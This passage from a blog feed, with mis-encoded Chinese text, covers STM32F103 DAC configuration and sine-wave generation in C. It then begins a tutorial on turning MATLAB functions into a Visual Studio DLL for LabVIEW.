<h3 id="ä¸»è¦ç‰¹å¾"><a href="#ä¸»è¦ç‰¹å¾" class="headerlink" title="ä¸»è¦ç‰¹å¾"></a>ä¸»è¦ç‰¹å¾</h3><p>DACçš„ä¸»è¦ç‰¹å¾æœ‰ï¼š</p>
<ol>
<li>2ä¸ªDACè½¬æ¢å™¨ï¼š1ä¸ªè¾“å‡ºé€šé“å¯¹åº”1ä¸ªè½¬æ¢å™¨</li>
<li>8ä½æˆ–è€…12ä½å•è°ƒè¾“å‡º</li>
<li>12ä½æ¨¡å¼ä¸‹æ•°æ®å·¦å¯¹é½æˆ–è€…å³å¯¹é½</li>
<li>åŒæ­¥æ›´æ–°åŠŸèƒ½</li>
<li>å™ªå£°æ³¢å½¢ç”Ÿæˆ</li>
<li>ä¸‰è§’æ³¢å½¢ç”Ÿæˆ</li>
<li>åŒDACé€šé“åŒæ—¶æˆ–è€…åˆ†åˆ«è½¬æ¢</li>
<li>æ¯ä¸ªé€šé“éƒ½æœ‰DMAåŠŸèƒ½</li>
<li>å¤–éƒ¨è§¦å‘è½¬æ¢</li>
<li>è¾“å…¥å‚è€ƒç”µå‹V_REF+</li>
</ol>
<h3 id="æ•°æ®å¯¹é½æ–¹å¼"><a href="#æ•°æ®å¯¹é½æ–¹å¼" class="headerlink" title="æ•°æ®å¯¹é½æ–¹å¼"></a>æ•°æ®å¯¹é½æ–¹å¼</h3><p>DAC è¾“å‡ºé€šé“çš„æ•°æ®å¯¹é½æ–¹å¼åŒ…å«ä»¥ä¸‹ä¸‰ç§ï¼š</p>
<ol>
<li>8ä½å³å¯¹é½</li>
<li>12ä½å·¦å¯¹é½</li>
<li>12ä½å³å¯¹é½</li>
</ol>
<p>æ­¤å¤–ï¼Œåœ¨å• DAC é€šé“æ¨¡å¼ä¸‹ï¼Œæ•°æ®å¯„å­˜å™¨çš„å­˜å‚¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/stm32/dacAlignMode.png" alt="dacAlignMode1"></p>
<p>åœ¨åŒ DAC é€šé“æ¨¡å¼ä¸‹ï¼Œæ•°æ®å¯„å­˜å™¨çš„å­˜å‚¨æ–¹å¼åˆ™ä¸ºï¼š</p>
<p><img src="/assets/stm32/dacAlignMode2.png" alt="dacAlignMode2"></p>
<p>æˆ‘é€šå¸¸ä¼šé€‰æ‹©12ä½å³å¯¹é½æ–¹å¼ï¼Œå¹¶åœ¨å•é€šé“æ¨¡å¼è®¾ç½®æ•°æ®æ—¶ä¸<code>0x0fff</code>è¿›è¡Œ&quot;ä½ä¸&quot;ã€‚</p>
<h3 id="DACè½¬æ¢"><a href="#DACè½¬æ¢" class="headerlink" title="DACè½¬æ¢"></a>DACè½¬æ¢</h3><p><img src="/assets/stm32/dacConvert.png" alt="dacConvert"></p>
<p>ç”¨æˆ·æ— æ³•ç›´æ¥å¯¹DACçš„æ•°æ®å¯„å­˜å™¨ DAC_DORx å†™å…¥æ•°æ®ï¼Œåªèƒ½é€šè¿‡ä¿®æ”¹æ•°æ®ä¿æŒå¯„å­˜å™¨ DAC_DHRx è£…å…¥æ•°æ®ã€‚</p>
<ol>
<li>æœªé€‰æ‹©&quot;ç¡¬ä»¶è§¦å‘&quot;æ—¶ï¼Œä¿æŒå¯„å­˜å™¨ DAC_DHRx çš„å€¼å°†åœ¨1ä¸ªAPB1å‘¨æœŸåè‡ªåŠ¨ä¼ å…¥æ•°æ®å¯„å­˜å™¨ DAC_DORxï¼›</li>
<li>å·²é€‰æ‹©&quot;ç¡¬ä»¶è§¦å‘&quot;æ—¶ï¼Œä¿æŒå¯„å­˜å™¨ DAC_DHRx çš„å€¼å°†åœ¨è§¦å‘å‘ç”Ÿå3ä¸ªAPB1åä¼ å…¥æ•°æ®å¯„å­˜å™¨ DAC_DORxã€‚</li>
<li>å½“æ•°æ®å­˜å…¥ DAC_DORx åå†ç»è¿‡æ—¶é—´ t_settingsï¼ˆä¸è´Ÿè½½å’Œç”µæºç”µå‹æœ‰å…³ï¼‰ï¼Œè¾“å‡ºå˜ä¸ºæœ‰æ•ˆã€‚</li>
</ol>
<h3 id="DACè§¦å‘æ–¹å¼"><a href="#DACè§¦å‘æ–¹å¼" class="headerlink" title="DACè§¦å‘æ–¹å¼"></a>DACè§¦å‘æ–¹å¼</h3><pre><code class="C">#define DAC_Trigger_None                   ((uint32_t)0x00000000)
/*!&lt; Conversion is automatic once the DAC1_DHRxxxx register
has been loaded, and not by external trigger */

#define DAC_Trigger_T6_TRGO                ((uint32_t)0x00000004)
/*!&lt; TIM6 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_T8_TRGO                ((uint32_t)0x0000000C)
/*!&lt; TIM8 TRGO selected as external conversion trigger for DAC channel
only in High-density devices*/

#define DAC_Trigger_T3_TRGO                ((uint32_t)0x0000000C)
/*!&lt; TIM8 TRGO selected as external conversion trigger for DAC channel
only in Connectivity line, Medium-density and Low-density Value Line devices */

#define DAC_Trigger_T7_TRGO                ((uint32_t)0x00000014)
/*!&lt; TIM7 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_T5_TRGO                ((uint32_t)0x0000001C)
/*!&lt; TIM5 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_T15_TRGO               ((uint32_t)0x0000001C)
/*!&lt; TIM15 TRGO selected as external conversion trigger for DAC channel
only in Medium-density and Low-density Value Line devices*/

#define DAC_Trigger_T2_TRGO                ((uint32_t)0x00000024)
/*!&lt; TIM2 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_T4_TRGO                ((uint32_t)0x0000002C)
/*!&lt; TIM4 TRGO selected as external conversion trigger for DAC channel */

#define DAC_Trigger_Ext_IT9                ((uint32_t)0x00000034)
/*!&lt; EXTI Line9 event selected as external conversion trigger for DAC channel */

#define DAC_Trigger_Software               ((uint32_t)0x0000003C)
/*!&lt; Conversion started by software trigger for DAC channel */
</code></pre>
<p><strong>è§¦å‘æ–¹å¼</strong> å¤§è‡´å¯åˆ†ä¸ºå››ç±»ï¼š</p>
<ol>
<li>DAC_Trigger_None : æ— è§¦å‘;</li>
<li>DAC_Trigger_Tx_TRGO : æ¥è‡ªç‰‡ä¸Šå®šæ—¶å™¨çš„TRGOè¾“å‡º</li>
<li>DAC_Trigger_Ext_IT9 : æ¥è‡ªå¤–éƒ¨ä¸­æ–­çº¿9çš„ä¸Šå‡æ²¿</li>
<li>DAC_Trigger_Software : æ¥è‡ªè½¯ä»¶æ§åˆ¶ä½ SWTRIG</li>
</ol>
<p>å½“ DAC æ¥å£æ£€æµ‹åˆ°æ¥è‡ªå®šæ—¶å™¨ <strong>TRGOè¾“å‡º</strong> æˆ– <strong>EXTI9</strong> çš„ä¸Šå‡æ²¿æ—¶ï¼Œæœ€è¿‘å­˜å…¥ DAC_DHRx ä¸­çš„æ•°æ®å°†è¢«ä¼ å…¥ DAC_DORx ä¸­ã€‚ç»3ä¸ªAPB1å‘¨æœŸåæ›´æ–° DAC_DORx çš„å€¼ã€‚å¯¹äº &quot;è½¯ä»¶è§¦å‘&quot;ï¼Œéœ€è¦åœ¨ç¨‹åºä¸­å¯¹ <strong>SWTRIG</strong> ç½®ä½å®Œæˆè§¦å‘ï¼Œè¯¥è§¦å‘ä½å°†è¢«ç¡¬ä»¶è‡ªåŠ¨æ¸…é›¶ã€‚</p>
<h3 id="DACè¾“å‡ºç”µå‹"><a href="#DACè¾“å‡ºç”µå‹" class="headerlink" title="DACè¾“å‡ºç”µå‹"></a>DACè¾“å‡ºç”µå‹</h3><p>DACè¾“å‡º = V_reference Ã— DOR /4095;</p>
<p>å¼ä¸­ï¼ŒV_reference ä¸ºå‚è€ƒç”µå‹ï¼ŒDOR ä¸º DAC è¾“å‡ºæ•°æ®å¯„å­˜å™¨çš„å€¼ï¼ˆ0~255/0~4095ï¼‰ã€‚</p>
<h2 id="DAC-åŸºæœ¬è¾“å‡ºæ–¹å¼"><a href="#DAC-åŸºæœ¬è¾“å‡ºæ–¹å¼" class="headerlink" title="DAC åŸºæœ¬è¾“å‡ºæ–¹å¼"></a>DAC åŸºæœ¬è¾“å‡ºæ–¹å¼</h2><h3 id="DAC-å‚æ•°è®¾ç½®"><a href="#DAC-å‚æ•°è®¾ç½®" class="headerlink" title="DAC å‚æ•°è®¾ç½®"></a>DAC å‚æ•°è®¾ç½®</h3><p>åœ¨<code>stm32f103</code>ä¸­åŒ…å«2ä¸ªé€šé“çš„12ä½<code>D/A</code>è½¬æ¢å™¨ï¼Œ<code>PA4</code>ä¸<code>PA5</code>ä½œä¸ºä¸¤ä¸ªé€šé“è¾“å‡ºæ¥å£ï¼Œåœ¨ä½¿ç”¨æ—¶éœ€è¦é…ç½®ä¸ºæ¨¡æ‹Ÿè¾“å…¥<code>AIN</code>ã€‚å½“ä½¿èƒ½ DAC çš„è¾“å‡ºé€šé“åï¼Œç›¸åº”çš„ GPIO ç®¡è„šå°†è‡ªåŠ¨ä¸ DAC çš„æ¨¡æ‹Ÿè¾“å‡ºæ¥å£ï¼ˆDAC_OUTxï¼‰ç›¸è¿ã€‚</p>
<pre><code class="C">void dacConfig(void)
{
  GPIO_InitTypeDef  GPIO_InitStructure;
  DAC_InitTypeDef DAC_InitStructure;

  /* å¼€å¯GPIOAæ—¶é’Ÿ */
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);

  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_4;
  GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_AIN;
  /* é…ç½®DACè¾“å‡ºé€šé“ */
  GPIO_Init(GPIOA, &amp;GPIO_InitStructure);


  /* å¼€å¯DACæ—¶é’Ÿ */
  RCC_APB1PeriphClockCmd(RCC_APB1Periph_DAC,ENABLE);

  DAC_InitStructure.DAC_Trigger = DAC_Trigger_None;                  // æ— è§¦å‘
  DAC_InitStructure.DAC_WaveGeneration = DAC_WaveGeneration_None;    // æ— æ³¢å½¢ç”Ÿæˆ
  DAC_InitStructure.DAC_LFSRUnmask_TriangleAmplitude = DAC_LFSRUnmask_Bit0;
  DAC_InitStructure.DAC_OutputBuffer = DAC_OutputBuffer_Disable;     // ç¦ç”¨è¾“å‡ºç¼“å­˜
  /* é…ç½®DACå‚æ•° */
  DAC_Init(DAC_Channel_1,&amp;DAC_InitStructure);

  /* enable dac1 */
  DAC_Cmd(DAC_Channel_1,ENABLE);
}
</code></pre>
<h3 id="è®¾ç½®-DAC-è¾“å‡ºç”µå‹"><a href="#è®¾ç½®-DAC-è¾“å‡ºç”µå‹" class="headerlink" title="è®¾ç½® DAC è¾“å‡ºç”µå‹"></a>è®¾ç½® DAC è¾“å‡ºç”µå‹</h3><p>ç»æµ‹è¯•ï¼Œæˆ‘æ‰€ç”¨æœ€å°ç³»ç»Ÿæ¿çš„DAå‚è€ƒç”µå‹å¹¶é<code>3.3v</code>ï¼Œè€Œæ˜¯æ¥è¿‘äº<code>3.24v</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®å®šä¹‰é…ç½®å¥½å‚è€ƒç”µå‹ã€‚</p>
<pre><code class="C">#define REFERENCE_VOLTAGE 3.24f      // DAC å‚è€ƒç”µå‹
</code></pre>
<p>æ ¹æ®å…¬å¼ <code>data = 4095*(v/v_ref)</code>å¯ä»¥æ±‚å¾—ç”µå‹vå¯¹åº”çš„12ä½æ•°ã€‚</p>
<pre><code class="C">void setVoltage(double voltage)
{
  uint16_t temp;

  if(voltage &lt; 0.0 || voltage &gt; REFERENCE_VOLTAGE)
    return;

  temp = (uint16_t)(4095*voltage/REFERENCE_VOLTAGE) &amp; 0x0fff;

  DAC_SetChannel1Data(DAC_Align_12b_R,temp);     // ç”µå‹è¾“å‡ºï¼š12ä½å³å¯¹é½
}
</code></pre>
<h3 id="äº§ç”Ÿæ­£å¼¦æ³¢ä¿¡å·"><a href="#äº§ç”Ÿæ­£å¼¦æ³¢ä¿¡å·" class="headerlink" title="äº§ç”Ÿæ­£å¼¦æ³¢ä¿¡å·"></a>äº§ç”Ÿæ­£å¼¦æ³¢ä¿¡å·</h3><p>ä½¿ç”¨å®å®šä¹‰<code>PI</code>ä»¥åŠé‡‡æ ·é¢‘ç‡ï¼Œå¹¶æ·»åŠ å¤´æ–‡ä»¶<code>math.h</code>ã€‚</p>
<pre><code class="C">#include &lt;math.h&gt;

#define PI  3.14159f
#define FSAMPLE 100                 // é‡‡æ ·é¢‘ç‡ ï¼ˆHzï¼‰
</code></pre>
<p>ä½¿ç”¨<code>sin</code>å‡½æ•°å’Œä¸€ä¸ª<code>static</code>å˜é‡å³å¯ç”Ÿæˆæ­£å¼¦ä¿¡å·ã€‚</p>
<pre><code class="C">void createSinWave(double baseAmp, double amp, double frequency, double fSample)
{
  static uint32_t time = 0;
  double voltage = 0.0;

  voltage = amp*sin(2*PI*frequency*time/fSample) + baseAmp;
  time++;

  setVoltage(voltage);
}
</code></pre>
<p>ä¿®æ”¹<code>main</code>å‡½æ•°ï¼Œæ¯éš”ä¸€ä¸ªé‡‡æ ·å‘¨æœŸä¿®æ”¹ä¸€æ¬¡DAè¾“å‡ºç”µå‹ï¼Œå®Œæˆæ­£å¼¦ä¿¡å·çš„è¾“å‡ºã€‚</p>
<pre><code class="C">int main(void)
{
  dacConfig();
  while(1)
  {
    createSinWave(2,0.5,1,FSAMPLE); // äº§ç”Ÿ 2Â±0.5v , 1Hz çš„æ­£å¼¦ä¿¡å·
    delayMs(1000.0/FSAMPLE);
  }
}
</code></pre>
<h3 id="æŸ¥çœ‹æ³¢å½¢"><a href="#æŸ¥çœ‹æ³¢å½¢" class="headerlink" title="æŸ¥çœ‹æ³¢å½¢"></a>æŸ¥çœ‹æ³¢å½¢</h3><p>ä½¿ç”¨ç¤ºæ³¢å™¨æˆ–NIé‡‡é›†å¡å³å¯æŸ¥çœ‹ç”Ÿæˆçš„æ­£å¼¦ä¿¡å·ã€‚</p>
<p><img src="/assets/stm32/dacOutput.png" alt="DacOutput"></p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> stm32 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Matlab - ç»VSå°†.mæ–‡ä»¶è½¬æ¢ä¸º.dllæ–‡ä»¶]]></title>
      <url>https://www.litreily.top/2016/11/25/matlab-coder/</url>
      <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>åœ¨ä½¿ç”¨ LabVIEW è¿›è¡Œè½¯ä»¶å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶éœ€è¦ä½¿ç”¨ Matlab å¼ºå¤§çš„æ•°æ®å¤„ç†åŠŸèƒ½ï¼Œä»¥æé«˜å¼€å‘æ•ˆç‡ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡ Matlab Coder å°† Matlab ä¸­çš„å‡½æ•°è½¬æ¢ä¸º C/C++ æºæ–‡ä»¶ï¼Œç„¶åé€šè¿‡ Visual Studio å°†è¿™äº›æºæ–‡ä»¶å°è£…ä¸º .dll æ–‡ä»¶ï¼Œæœ€åé€šè¿‡ LabVIEW è°ƒç”¨åº“å‡½æ•°å®ç°å¯¹ Matlab å‡½æ•°çš„è°ƒç”¨ã€‚</p>
<p>æœ¬æ–‡å°†é€šè¿‡ä¸€ä¸ªå®ä¾‹è®²è¿°ä»¥ä¸ŠåŠŸèƒ½çš„å®ç°è¿‡ç¨‹ï¼Œå¤§ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>Matlab ç¼–å†™ä»£ç <br> 1.1 ç¼–å†™ .m å‡½æ•°<br> 1.2 ä½¿ç”¨ Coder ç”Ÿæˆ C/C++ æ–‡ä»¶</li>
<li>Visual Studio ç”Ÿæˆ .dll æ–‡ä»¶</li>
<li>LabVIEW è°ƒç”¨ .dllæ–‡ä»¶</li>
</ol>
<p>è½¯ä»¶ç‰ˆæœ¬è¯´æ˜ï¼š</p>
<ol>
<li>Matlab 2016a       (64bit)</li>
<li>LabVIEW 2015       (64bit)</li>
<li>Visual Studio 2015 (64bit)</li>
</ol>
<h2 id="é€šè¿‡-Matlab-ç”Ÿæˆ-C-C-æºæ–‡ä»¶"><a href="#é€šè¿‡-Matlab-ç”Ÿæˆ-C-C-æºæ–‡ä»¶" class="headerlink" title="é€šè¿‡ Matlab ç”Ÿæˆ C/C++ æºæ–‡ä»¶"></a>é€šè¿‡ Matlab ç”Ÿæˆ C/C++ æºæ–‡ä»¶</h2><h3 id="m-å‡½æ•°ç¼–ç "><a href="#m-å‡½æ•°ç¼–ç " class="headerlink" title=".m å‡½æ•°ç¼–ç "></a>.m å‡½æ•°ç¼–ç </h3><p>åœ¨ Matlab æ–‡ä»¶ç›®å½•ä¸­æ–°å»ºæ–‡ä»¶å¤¹&quot;CreateDll&quot;ï¼Œåœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸¤ä¸ªå‡½æ•°æ–‡ä»¶ï¼Œåˆ†åˆ«å®ç°ç®€å•åŠ æ³•è¿ç®—å‡½æ•°ï¼Œä»¥åŠä¸€ä¸ªç”¨è‡ªç›¸å…³æ±‚è§£å‘¨æœŸä¿¡å·é¢‘ç‡çš„å‡½æ•°ã€‚</p>
<p>add(a, b)</p>
<pre><code class="matlab">function [ answer ] = add( a,b )
% åŠ æ³•è¿ç®—
% a,b å‡ä¸º double å‹æ•°æ®

answer = a + b;

end
</code></pre>
<p>getFreq( signal, fs )</p>
<pre><code class="matlab">function [ frequency ] = getFreq( signal,fs )
%GETFREQ è‡ªç›¸å…³æ³•æ±‚å‘¨æœŸä¿¡å·é¢‘ç‡
% [input]
% signal    : double 1*n
% fs        : double 1*1
% [output]
% frequency : double  1*1

y_xcorr = xcorr(signal,&#39;coeff&#39;);            % ä¿¡å·è‡ªç›¸å…³
[~,locs] = findpeaks(y_xcorr);              % è·å–å³°å€¼ä½ç½®
middlePosition = fix(length(locs)/2);       % è®¡ç®—å¤„äºä¸­éƒ¨çš„å³°å€¼ä½ç½®
frequency = fs/(locs(middlePosition)-locs(middlePosition-1)); % è®¡ç®—ä¿¡å·é¢‘ç‡

end
</code></pre>
<h3 id="ä½¿ç”¨-Coder-ç”Ÿæˆ-C-C-æ–‡ä»¶"><a href="#ä½¿ç”¨-Coder-ç”Ÿæˆ-C-C-æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ Coder ç”Ÿæˆ C/C++ æ–‡ä»¶"></a>ä½¿ç”¨ Coder ç”Ÿæˆ C/C++ æ–‡ä»¶</h3><ul>
<li>1.åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ coder æ‰“å¼€ Matlab Coder å·¥å…·ã€‚</li>
</ul>
<pre><code class="matlab">&gt;&gt; coder
</code></pre>
<p><img src="/assets/matlab/coder1.png" alt="Matlab Coder"></p>
<ul>
<li>2.æ·»åŠ  add å‡½æ•°åŠ getFreq å‡½æ•°</li>
</ul>
<p><img src="/assets/matlab/coder2.png" alt="Matlab Coder"></p>
<ul>
<li>3.å®šä¹‰å‡½æ•°è¾“å…¥å‚æ•°çš„æ•°æ®ç±»å‹ï¼ˆä¸¤ç§å®šä¹‰æ–¹å¼ï¼‰</li>
</ul>
<ol>
<li>æ‰‹åŠ¨ä¿®æ”¹è¾“å…¥å‚æ•°çš„æ•°æ®ç±»å‹</li>
<li>è¾“å…¥å‡½æ•°è°ƒç”¨ç¤ºä¾‹ï¼Œé€šè¿‡ Coder å·¥å…·çš„è‡ªå®šä¹‰è¾“å…¥åŠŸèƒ½è‡ªåŠ¨åŒ¹é…è¾“å…¥å‚æ•°ç±»å‹</li>
</ol>
<p>è°ƒç”¨ç¤ºä¾‹ï¼š</p>
<pre><code class="matlab">&gt;&gt; add(3,4);
</code></pre>
<p><img src="/assets/matlab/coder3.png" alt="Matlab Coder"></p>
<p>æ‰‹åŠ¨å¯é€‰æ‹©çš„æ•°æ®ç±»å‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/assets/matlab/coder3_1.png" alt="Input types"></p>
<ul>
<li>4.è®¾å®šæ•°æ®é•¿åº¦</li>
</ul>
<ol>
<li>å¯¹äºå¤§éƒ¨åˆ†å˜é‡ï¼Œæ•°æ®é•¿åº¦ä¸º 1Ã—1</li>
<li>å¯¹äºä¸€ç»´<strong>å‘é‡ã€æ•°ç»„</strong><br>2.1 å›ºå®šé•¿åº¦çš„å˜é‡ï¼šç›´æ¥è®¾å®šå…·ä½“å€¼ï¼ˆå¦‚ï¼šä¸€ä¸ªæ˜ŸæœŸæ¯å¤©çš„å·¥ä½œæ—¶é—´ï¼Œå¯è®¾ä¸º 1Ã—7ï¼‰<br>2.2 ä¸å®šé•¿åº¦ä½†æœ‰ä¸Šé™çš„å˜é‡ï¼šè®¾å®š 1Ã—:100 ï¼ˆå‡å®šä¸Šé™å€¼ä¸º 100ï¼‰<br>2.3 ä¸å®šé•¿åº¦ä¸Šé™ä¸å®šçš„å˜é‡ï¼šè®¾å®š 1Ã—:inf ï¼ˆinfä»£è¡¨æ— é™ï¼‰</li>
<li>äºŒç»´æ•°ç»„è®¾å®šè§„åˆ™ä¸ä¸€ç»´æ•°ç»„ç±»ä¼¼</li>
</ol>
<p><img src="/assets/matlab/coder3_2.png" alt="Input length"></p>
<ul>
<li>5.Check for Run-Time Issues</li>
</ul>
<p>è¿™ä¸€æ­¥å¯ä»¥è·³è¿‡ï¼Œè¿™æ˜¯ç”¨æ¥ç”Ÿæˆè¯•ç”¨ä»£ç ä»¥åŠç”¨äº Matlab çš„ MEX æ–‡ä»¶ã€‚</p>
<p><img src="/assets/matlab/coder4.png" alt="Check for Run-Time Issues"></p>
<ul>
<li>6.Generate Code</li>
</ul>
<p>é€‰æ‹© C++ è¯­è¨€ï¼Œé€šè¿‡ &quot; More Settings &quot; ä¿®æ”¹ä»£ç ç”Ÿæˆç›¸å…³çš„é…ç½®é€‰é¡¹,æœ€åç‚¹å‡» &quot; Generate &quot; æŒ‰é’®ç”Ÿæˆæºä»£ç ã€‚</p>
<p>é€‰æ‹©è¯­è¨€&lt;<img src="/assets/matlab/coder5.png" alt="Generate Code"></p>
<p>é…ç½®é€‰é¡¹&lt;<img src="/assets/matlab/coder5_1.png" alt="More Settings"></p>
<p>ç”Ÿæˆä»£ç &lt;<img src="/assets/matlab/coder6.png" alt="C++ Code"></p>
<p>åœ¨ä»£ç ç”Ÿæˆç•Œé¢å¯ä»¥çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p>
<ol>
<li>Source Code : Matlab ä¸­åˆ›å»ºçš„å‡½æ•°æºä»£ç </li>
<li>Output Files : Coder å·¥å…·ç”Ÿæˆå¾—åˆ°çš„ .h å¤´æ–‡ä»¶å’Œ .cpp æºæ–‡ä»¶</li>
<li>Build Log : ç”¨äºæŸ¥çœ‹ä»£ç ç”ŸæˆæŠ¥å‘Š</li>
<li>Variables : é€‰ä¸­ Matlab æ–‡ä»¶æ—¶æ˜¾ç¤ºå‡½æ•°çš„è¾“å…¥è¾“å‡ºæ•°æ®ç±»å‹å’Œå¤§å°</li>
</ol>
<ul>
<li>7.Finsh Workflow</li>
</ul>
<p>å®Œæˆå·¥ä½œæµç¨‹&lt;<img src="/assets/matlab/coder7.png" alt="Finish WorkFlow"></p>
<p>æŸ¥çœ‹ä»£ç &lt;<img src="/assets/matlab/coder8.png" alt="Select Code"></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œæœ€ç»ˆç”Ÿæˆçš„æ–‡ä»¶è¾ƒå¤šï¼Œä»£ç é‡è¾ƒå¤§ï¼Œè¿™å¯ä»¥å½’ç»“ä¸ºä»¥ä¸‹å‡ ä¸ªåŸå› ï¼š</p>
<ol>
<li>é‡æ–°å®ç°fftç­‰å¤æ‚ç®—æ³•</li>
<li>è€ƒè™‘å„ç§å¼‚å¸¸æƒ…å†µçš„å¤„ç†</li>
<li>è€ƒè™‘ä¸å®šé•¿æ•°ç»„æˆ–å‘é‡çš„å†…å­˜åˆ†é…é—®é¢˜</li>
<li>è€ƒè™‘æ— é™å€¼ inf å’Œ æ— æ•ˆå€¼ NaN</li>
<li>ä¸åŒç¼–ç¨‹è¯­è¨€é—´æ•°æ®ç±»å‹çš„è½¬æ¢</li>
</ol>
<p>å½“ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»£ç ç”Ÿæˆå‰æ ¹æ®éœ€æ±‚è¿›è¡Œç›¸å…³è®¾ç½®ï¼Œä»¥é¿å…ä¸å¿…è¦æ–‡ä»¶çš„äº§ç”Ÿï¼Œæ­¤å¤„ä¸äºˆè¯¦è¿°ã€‚</p>
<p>æœ€åå°†ç”Ÿæˆçš„æ‰€æœ‰ .h/.cpp æ–‡ä»¶å¤åˆ¶åˆ°å‰ªåˆ‡æ¿ä¸­ä»¥å¤‡åç”¨ã€‚è‡³æ­¤ï¼ŒMatlab éƒ¨åˆ†çš„å·¥ä½œå·²ç»å…¨éƒ¨å®Œæˆã€‚</p>
<h2 id="é€šè¿‡-Visual-Studio-ç”Ÿæˆ-dll-æ–‡ä»¶"><a href="#é€šè¿‡-Visual-Studio-ç”Ÿæˆ-dll-æ–‡ä»¶" class="headerlink" title="é€šè¿‡ Visual Studio ç”Ÿæˆ .dll æ–‡ä»¶"></a>é€šè¿‡ Visual Studio ç”Ÿæˆ .dll æ–‡ä»¶</h2><p>åœ¨ VS ä¸­è¦åšçš„å°±æ˜¯å°† Matlab Coder ç”Ÿæˆçš„ C++ æ–‡ä»¶å°è£…ä¸º dll æ–‡ä»¶ï¼Œä»¥ä¾› LabVIEW ç¨‹åºè°ƒç”¨ã€‚</p>
<h3 id="åˆ›å»º-win32-é¡¹ç›®"><a href="#åˆ›å»º-win32-é¡¹ç›®" class="headerlink" title="åˆ›å»º win32 é¡¹ç›®"></a>åˆ›å»º win32 é¡¹ç›®</h3><p><img src="/assets/matlab/CreateDll.png" alt="Create VS Project"></p>
<p>åœ¨win32åº”ç”¨ç¨‹åºå‘å¯¼ä¸­é€‰æ‹© <strong>DLL</strong>ï¼Œå¹¶å‹¾é€‰ <strong>ç©ºé¡¹ç›®</strong> ï¼Œç„¶åç‚¹å‡»å®Œæˆã€‚</p>
<p><img src="/assets/matlab/CreateDll1.png" alt="Create VS Project"></p>
<h3 id="æ·»åŠ æ–‡ä»¶"><a href="#æ·»åŠ æ–‡ä»¶" class="headerlink" title="æ·»åŠ æ–‡ä»¶"></a>æ·»åŠ æ–‡ä»¶</h3><p>å°†ä» Matlab ä¸­å¤åˆ¶çš„ C++ æ–‡ä»¶ç²˜è´´åˆ° CreateDll é¡¹ç›®çš„æœ¬åœ°æ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨é¡¹ç›®ä¸­æ·»åŠ è¿™äº›æ–‡ä»¶ã€‚</p>
<p><img src="/assets/matlab/CreateDll2_1.png" alt="Add Source Files to VS Project"></p>
<p><img src="/assets/matlab/CreateDll2.png" alt="Add Source Files to VS Project"></p>
<h3 id="æ–°å»ºæ¨¡å—å®šä¹‰æ–‡ä»¶"><a href="#æ–°å»ºæ¨¡å—å®šä¹‰æ–‡ä»¶" class="headerlink" title="æ–°å»ºæ¨¡å—å®šä¹‰æ–‡ä»¶"></a>æ–°å»ºæ¨¡å—å®šä¹‰æ–‡ä»¶</h3><p>åœ¨ VS ä¸­æ–°å»º .def æ¨¡å—å®šä¹‰æ–‡ä»¶ï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç </p>
<pre><code class="def">LIBRARY CreateDll

EXPORTS

add
getFreq
</code></pre>
<p>LIBRARY åé¢æ·»åŠ åº“åç§°ï¼ŒEXPORTS åé¢æ·»åŠ éœ€è¦å¯¼å‡ºçš„å‡½æ•°åç§°ã€‚</p>
<p><img src="/assets/matlab/CreateDll3.png" alt=".def file"></p>
<p>ç¼–è¾‘å®Œæˆåï¼Œå¯ä»¥åœ¨ &quot;é¡¹ç›®å±æ€§&gt;&gt;é“¾æ¥å™¨&gt;&gt;è¾“å…¥&gt;&gt;æ¨¡å—å®šä¹‰æ–‡ä»¶&quot; ä¸­çœ‹åˆ°ï¼Œé¡¹ç›®å·²å°†è¯¥é€‰é¡¹è‡ªåŠ¨æ·»åŠ ä¸ºäº†å½“å‰ .def æ–‡ä»¶ï¼Œå¯¹äºä½ç‰ˆæœ¬çš„ VS å¯èƒ½éœ€è¦æ‰‹åŠ¨æ·»åŠ ã€‚</p>
<h3 id="ç”Ÿæˆ-dll-æ–‡ä»¶"><a href="#ç”Ÿæˆ-dll-æ–‡ä»¶" class="headerlink" title="ç”Ÿæˆ .dll æ–‡ä»¶"></a>ç”Ÿæˆ .dll æ–‡ä»¶</h3><p>æœ€åä¸€æ­¥ï¼Œé€‰ä¸­é¡¹ç›®åç§°ï¼Œç‚¹å‡»å³é”®é€‰æ‹© &quot;<strong>ç”Ÿæˆ</strong>&quot; ï¼Œä»æœ¬åœ°é¡¹ç›®ç›®å½•çš„ Debug æ–‡ä»¶å¤¹ä¸­å¯ä»¥æ‰¾åˆ°å·²ç”Ÿæˆçš„ .dll æ–‡ä»¶ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š</p>
<ol>
<li>é€‰æ‹© Debug æ¨¡å¼ä¸º x64 æ—¶ç”Ÿæˆ 64 ä½ dll æ–‡ä»¶ï¼Œæ–‡ä»¶å­˜äº .\x64\Debug\Create.dll</li>
